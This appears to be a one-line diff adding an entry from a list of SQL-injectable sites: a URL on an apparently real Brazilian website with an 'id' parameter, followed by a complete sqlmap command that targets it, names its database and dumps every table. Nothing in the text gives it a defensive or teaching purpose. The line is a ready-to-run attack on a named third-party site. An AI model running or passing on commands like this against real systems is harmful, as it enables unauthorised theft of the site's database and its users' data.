@@ -1,0 +1,1 @@
+https://www.brucebrasil.com.br/conteudo.php?id=83 (GET)  # sqlmap.py -u https://www.brucebrasil.com.br/conteudo.php?id=83 -D brucebra_db --tables --dump-all --threads 5 -v3
